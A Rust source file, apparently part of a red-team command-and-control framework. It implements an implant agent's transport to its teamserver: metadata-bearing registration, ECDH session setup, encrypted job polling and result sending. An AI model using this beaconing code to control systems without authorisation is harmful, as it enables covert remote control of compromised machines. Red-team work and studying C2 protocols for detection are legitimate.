//! Agent-level HTTP transport methods: handshake, job polling, and packet send.

use red_cell_common::agent_protocol::serialize_init_metadata;
use red_cell_common::demon::{DemonCommand, DemonMessage, DemonPackage};

use super::PhantomAgent;
use crate::ecdh::{decode_listener_pub_key, perform_registration, send_session_packet};
use crate::error::PhantomError;
use crate::protocol::{
    build_callback_packet, build_init_packet, callback_ctr_blocks, parse_init_ack,
    parse_job_response,
};

impl PhantomAgent {
    /// Perform the initial registration handshake.
    pub async fn init_handshake(&mut self) -> Result<(), PhantomError> {
        let metadata = self.collect_metadata();
        let packet = build_init_packet(
            self.agent_id,
            &self.raw_crypto,
            &metadata,
            self.config.init_secret_version,
        )?;
        let response = self.transport.send(&packet).await?;
        self.ctr_offset = parse_init_ack(&response, self.agent_id, &self.session_crypto)?;
        Ok(())
    }

    /// Send a `COMMAND_GET_JOB` and return the decrypted task packages.
    ///
    /// The teamserver responds with a raw [`DemonMessage`] byte stream where
    /// each package payload is individually encrypted at successive monotonic
    /// CTR offsets — no outer envelope.
    pub async fn get_job(&mut self) -> Result<Vec<DemonPackage>, PhantomError> {
        let packet = build_callback_packet(
            self.agent_id,
            &self.session_crypto,
            self.ctr_offset,
            self.callback_seq,
            u32::from(DemonCommand::CommandGetJob),
            0,
            &[],
        )?;

        let result = self.transport.send(&packet).await;

        // Always advance seq and request-side CTR — the server consumes both
        // before sending a response, so skipping on transport failure desyncs.
        self.ctr_offset += callback_ctr_blocks(u32::from(DemonCommand::CommandGetJob), 0);
        self.callback_seq += 1;

        let response = result?;

        let (packages, next_offset) =
            parse_job_response(&self.session_crypto, self.ctr_offset, &response)?;
        self.ctr_offset = next_offset;

        Ok(packages)
    }

    pub(super) async fn send_packet(&self, packet: Vec<u8>) -> Result<(), PhantomError> {
        let _response = self.transport.send(&packet).await?;
        Ok(())
    }

    /// Perform the ECDH registration handshake.
    ///
    /// Encodes agent metadata, performs X25519 ECDH with the listener, and stores
    /// the resulting session for all subsequent packets. Sets `self.agent_id` to
    /// the value assigned by the teamserver.
    pub async fn ecdh_init_handshake(&mut self) -> Result<(), PhantomError> {
        let key_str = self
            .config
            .listener_pub_key
            .as_deref()
            .ok_or(PhantomError::InvalidConfig("listener_pub_key required for ECDH"))?;
        let listener_pub_key = decode_listener_pub_key(key_str)?;

        let metadata = self.collect_metadata();
        let metadata_bytes = serialize_init_metadata(self.agent_id, &metadata)
            .map_err(|e| PhantomError::Transport(format!("ECDH metadata encode: {e}")))?;

        let session = perform_registration(&self.transport, &listener_pub_key, &metadata_bytes)
            .await
            .map_err(|e| PhantomError::Transport(format!("ECDH registration: {e}")))?;

        self.agent_id = session.agent_id;
        self.ecdh_session = Some(session);
        Ok(())
    }

    /// Send packages as an ECDH session packet and return the decrypted response bytes.
    pub(super) async fn ecdh_send_packages(
        &mut self,
        packages: Vec<DemonPackage>,
    ) -> Result<Vec<u8>, PhantomError> {
        let (connection_id, session_key, agent_id) = self
            .ecdh_session
            .as_ref()
            .ok_or_else(|| PhantomError::Transport("ECDH session not initialized".into()))
            .map(|s| (s.connection_id, s.session_key, s.agent_id))?;
        let msg_bytes = DemonMessage::new(packages)
            .to_bytes()
            .map_err(|e| PhantomError::Transport(format!("ECDH message encode: {e}")))?;

        // seq_num(8 LE) | DemonMessage — server rejects packets with seq ≤ last seen.
        let seq = self.callback_seq;
        let mut payload = Vec::with_capacity(8 + msg_bytes.len());
        payload.extend_from_slice(&seq.to_le_bytes());
        payload.extend_from_slice(&msg_bytes);

        let result = send_session_packet(
            &self.transport,
            &crate::ecdh::EcdhSession { connection_id, session_key, agent_id },
            &payload,
        )
        .await;

        // Always advance the sequence counter — even on failure. The teamserver
        // consumes the seq_num *before* dispatching the payload, so if the
        // server accepted the packet but returned an error (dispatch failure,
        // transient DB issue, etc.) and we do NOT advance, every subsequent
        // packet replays the same seq and is permanently rejected.
        self.callback_seq += 1;
        result
    }
}
